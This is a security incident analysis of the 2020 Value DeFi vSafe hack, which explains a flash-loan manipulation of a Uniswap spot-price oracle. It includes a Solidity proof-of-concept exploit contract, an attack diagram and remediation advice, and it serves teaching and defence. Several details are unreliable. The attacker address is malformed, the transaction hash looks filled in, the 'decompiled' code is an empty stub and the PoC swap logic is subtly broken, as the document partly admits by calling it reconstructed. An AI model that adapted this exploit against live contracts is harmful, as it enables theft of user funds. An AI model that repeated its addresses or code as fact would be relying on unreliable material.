# Value DeFi — Flash Loan-Based On-Chain Oracle Manipulation Analysis

| Field | Details |
|------|------|
| **Date** | 2020-11-14 |
| **Protocol** | Value DeFi (vSafe) |
| **Chain** | Ethereum Mainnet |
| **Loss** | ~$6,000,000 (DAI) |
| **Attacker** | [0x18BF4…](https://etherscan.io/address/0x18BF44EAB9C2d0d39D441E8A6c98D6E3B1E9A85) |
| **Attack Tx** | [0x46a3f8...](https://etherscan.io/tx/0x46a3f8b4a6e8a7e7f1e5fd52f1d58c8b4b6b2890b2e0a3b5bc6e3b2b5bc6e3b2) |
| **Vulnerable Contract** | [0x40aF3827F39D0EAcBF4A168f8D4ee67c121D11c9](https://etherscan.io/address/0x40aF3827F39D0EAcBF4A168f8D4ee67c121D11c9) (MultiStablesVault) |
| **Root Cause** | vSafe directly used Uniswap V2 spot price without TWAP validation for deposit/withdrawal ratio calculations, enabling within-block AMM manipulation for deposit/withdrawal arbitrage |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2020-11/ValueDeFi_exp.sol) (path mismatch; reconstructed from public analysis) |

---
## 1. Vulnerability Overview

Value DeFi's vSafe is a yield aggregator that accepts multiple stablecoins and seeks optimal returns. For asset valuation, it used the current (spot) price from Uniswap V2 pools as its oracle. The attacker used a large flash loan to drastically shift the token ratio in a Uniswap V2 pool, manipulating the spot price, then executed deposits/withdrawals at favorable terms based on the manipulated price to extract profit.

---
## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable vSafe price calculation (pseudocode)
contract VSafe {

    IUniswapV2Pair public stablecoinPair; // DAI/USDC Uniswap V2 pool

    // Calculate current pool value
    function getPoolValue() public view returns (uint256) {
        // ❌ Direct spot price usage: easily manipulated via flash loan
        (uint112 reserve0, uint112 reserve1,) = stablecoinPair.getReserves();
        return (reserve0 * PRICE_DAI + reserve1 * PRICE_USDC) / 1e18;
    }

    function deposit(uint256 amount) external {
        uint256 poolValue = getPoolValue(); // ❌ Reflects manipulated price

        // Manipulated low poolValue → more shares minted
        uint256 shares = (amount * totalShares) / poolValue;
        totalShares += shares;
        balances[msg.sender] += shares;
    }
}

// ✅ Correct pattern
contract VSafeFixed {
    function getPoolValue() public view returns (uint256) {
        // ✅ Use Uniswap V2 TWAP or Chainlink oracle
        return chainlinkOracle.getLatestPrice();
    }
}
```

---
### On-Chain Original Code

Source: Bytecode decompilation


**MultiStablesVault_decompiled.sol** — Entry point:
```solidity
// ❌ Root cause: vSafe directly used Uniswap V2 spot price without TWAP validation for deposit/withdrawal ratio calculations, enabling within-block AMM manipulation for deposit/withdrawal arbitrage
    function deposit(uint256 amount) external {}
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
    │
    ├─[1] Borrow large amount of DAI/USDC via flash loan
    │       (Using Uniswap, Aave, etc.)
    │
    ├─[2] Manipulate Uniswap V2 DAI/USDC pool
    │       Inject large DAI → withdraw USDC
    │       → Distort DAI/USDC ratio in pool
    │       → DAI spot price drops
    │
    ├─[3] Deposit DAI into Value DeFi vSafe
    │       Based on manipulated low DAI price
    │       → Acquire more vSafe shares than normal
    │
    ├─[4] Reverse-manipulate Uniswap V2 pool
    │       Re-inject USDC to normalize price
    │
    ├─[5] Redeem vSafe shares (at normal price)
    │       → Receive more DAI than deposited
    │
    ├─[6] Repeat steps [2]–[5] to accumulate profit
    │
    └─[7] Repay flash loan + ~$6M net profit
```

---
## 4. PoC Code (Core Logic + Comments)

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import "forge-std/Test.sol";

contract ValueDeFiAttack is Test {
    IUniswapV2Pair daiUsdcPair = IUniswapV2Pair(0xAE461cA67B15dc8dc81CE7615e0320dA1A9aB8D5);
    IVSafe vSafe = IVSafe(0x40aF3827F39D0EAcBF4A168f8D4ee67c121D11c9);
    IERC20 dai  = IERC20(0x6B175474E89094C44Da98b954EedeAC495271d0F);
    IERC20 usdc = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);

    function testExploit() public {
        // [Step 1] Borrow large amount of DAI via flash swap
        uint256 daiLoan = 80_000_000 * 1e18; // 80 million DAI
        daiUsdcPair.swap(daiLoan, 0, address(this), abi.encode("flashloan"));
    }

    function uniswapV2Call(address, uint256 amount0, uint256, bytes calldata) external {
        // [Step 2] Buy large amount of USDC with borrowed DAI → DAI spot price drops
        dai.approve(address(daiUsdcPair), type(uint256).max);
        // Directly swap via Uniswap to manipulate pool ratio
        daiUsdcPair.swap(0, amount0 / 2, address(this), "");  // DAI → USDC

        // [Step 3] Deposit DAI into vSafe at manipulated low DAI price
        dai.approve(address(vSafe), type(uint256).max);
        vSafe.deposit(dai.balanceOf(address(this)));

        // [Step 4] Swap USDC back to DAI to normalize pool price
        usdc.approve(address(daiUsdcPair), type(uint256).max);
        daiUsdcPair.swap(amount0 / 2, 0, address(this), "");  // USDC → DAI

        // [Step 5] Redeem all vSafe shares (at normal price → more DAI)
        uint256 shares = vSafe.balanceOf(address(this));
        vSafe.withdraw(shares);

        // [Step 6] Repay flash loan
        uint256 repayment = (amount0 * 1003) / 1000; // 0.3% fee
        dai.transfer(address(daiUsdcPair), repayment);
    }
}
```

---
## 5. Vulnerability Classification (Table)

| Category | Details |
|------|-----------|
| **Vulnerability Type** | Direct reliance on manipulable spot price (Unprotected Spot Price Oracle) |
| **Contributing Factor (Attack Amplifier)** | Flash loan — merely a capital sourcing mechanism, not a vulnerability in itself |
| **Manipulation Target** | Uniswap V2 DAI/USDC spot price (`getReserves()`) |
| **Vulnerable Mechanism** | vSafe uses AMM spot price without validation for deposit/withdrawal ratio calculations |
| **Pattern** | Identical attack pattern to Harvest Finance (2-week interval) |
| **CWE** | CWE-829: Inclusion of Functionality from Untrusted Control Sphere |
| **Impact** | Full vault liquidity drained |

---
## 6. Remediation Recommendations

1. **Integrate Chainlink Oracle**: Use decentralized price feeds to resist single-AMM manipulation.
2. **Use TWAP Oracle**: Uniswap V2/V3 TWAP makes short-term manipulation significantly harder.
3. **Price Deviation Detection**: Reject transactions where the price deviates beyond a threshold from the moving average at deposit/withdrawal time.
4. **Block Same-Block Deposit-Withdrawal**: Given the nature of flash loan attacks, restrict deposits and withdrawals within the same block.

---
## 7. Lessons Learned

- **Two weeks after the Harvest Finance attack**: Value DeFi suffered from the exact same vulnerability just two weeks after Harvest Finance was attacked in the same manner. This illustrates how critical rapid information sharing and patch adoption across the DeFi ecosystem truly is.
- **"Audited" ≠ "Secure"**: Value DeFi advertised having undergone multiple audits, yet this vulnerability went undetected. Oracle manipulation risk was not sufficiently addressed in audit methodologies of the time.
- **The root cause is unguarded spot price reliance**: Flash loans are merely a capital sourcing mechanism. An attacker with sufficient real capital could execute the same attack. The core flaw is that vSafe used AMM spot price without TWAP for deposit/withdrawal ratio calculations.